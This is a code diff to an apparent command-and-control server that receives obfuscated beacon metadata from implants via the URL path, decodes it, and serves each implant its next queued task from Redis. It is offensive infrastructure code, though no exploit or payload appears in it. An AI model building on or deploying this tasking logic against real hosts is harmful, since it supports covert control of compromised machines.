@@ -349,6 +349,7 @@ async def http_get(request: Request) -> Response:
         )
         print(f"Data from implant: {data_from_implant}")
     except Exception as e:
+        print(e)
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     """
@@ -428,86 +429,93 @@ async def http_get(request: Request) -> Response:
             return Response(status_code=500)
 
 
-async def http_get_uri(request: Request, data: str) -> Response:
-    """ """
-    print(request)
-    print(data)
-
-    # we can assume URI terminator is uri-append.
-    # data is the /someendpoint/<HERE>, so we just need to transform it.
-
-    full_uri = str(
-        request.url
-    )  # Full URL including the scheme, host, path, and query params. useful for logging
-
+async def http_get_uri(request: Request) -> Response:
+    """
+    Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
+    side.
+    """
     try:
-        hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
-        print(f"De-Obsfucated data: {hce.apply_transforms(data=data)}")
+        print(request)
+        path = request.url.path
+        print("Full path:", path)
 
-        print(f"Full URL: {full_uri}")
-        print(f"Data from URL: {data}")
+        # Last segment
+        data_in_uri = path.rstrip("/").split("/")[-1]
+        print("Last data_in_uri:", data_in_uri)
     except Exception as e:
+        print(e)
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
-    # save to redis...
-    # generate response...
+    # we can assume URI terminator is uri-append.
+    # data is the /someendpoint/<HERE>, so we just need to grab it, and transform it.
+
+    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
+    try:
+        deobsfucated_data_from_implant = hce.apply_transforms(data=data_in_uri)
+        print(f"De-Obsfucated data: {deobsfucated_data_from_implant}")
+        print(f"Data from implant: {data_in_uri}")
+    except Exception as e:
+        print(e)
+        raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     """
     Setup a response for the implant
 
     """
-
-    # pass in block to respective class
-    emitter = HttpGetBlockServerParser(mp.http_get.server)
-
-    # get the stuff we need from it
-    headers = emitter.headers()
-    data = emitter.generate_data()
+    # take extracted data, shove into class:
+    try:
+        unpacked_metadata = msgpack.unpackb(deobsfucated_data_from_implant)
+        md = Metadata(unpacked_metadata)
+        md.validate()  # , if err return 400 malformed
+    except Exception as e:
+        print(e)
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail=f"Malformed data",
+        )
 
     # note, payload would need to be inserted somehwere here too.  Ex,
     # redis lookup for next task -> insert where print it
-
     # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+    implant_id = unpacked_metadata.get("implant_uuid", None)
+    check_if_data(implant_id)
 
-    # some redis conn
-    # based on implant_id, push de-obsfucated data to redis
+    its = RedisImplantTaskService(implant_id)
+    msgpack_task = its.dequeue_task()
+    if not msgpack_task:
+        raise HTTPException(
+            status_code=204  # 204 for no content, but the request suceeded.
+        )
 
-    # based on terminationstatement, need to store data in certain location
+    # pass in block to respective class
+    # get the stuff we need from it
+    emitter = HttpGetBlockServerParser(mp.http_get.server)
+    headers = emitter.headers()
+    obsfucated_task = emitter.generate_data(msgpack_task)
+
+    """
+    Setup a response for the implant
+
+    """
     # Ex: header: store in header
     terminator_type, target = emitter.get_output_terminator()
 
     match terminator_type:
-        case "header":
-            # send data in a header
-            headers[target] = data
-            # construct response here
 
-        case "parameter":
-            # send data as URI parameter
-            # params[target] = data
-            print("placeholder uri paramter")
-
-        case "uri-append":
-            # append data to URL path
-            # url += data.decode("latin-1")
-            print("placeholder uri append")
+        # case "header":
+        #     # send data in a header
+        #     headers[target] = obsfucated_task
+        #     # construct response here
 
         case "print":
             # send data in the body
-            body = data
+            body = obsfucated_task
             # and construct the response
-            return Response(content=body, headers=headers)
-
-        case None:
-            # fallback if no terminator\
-
-            body = data
             return Response(content=body, headers=headers)
 
         case _:
             # unknown terminator
             print("Unknown terminator: %r", terminator_type)
-            body = data
             return Response(status_code=500)
 
 
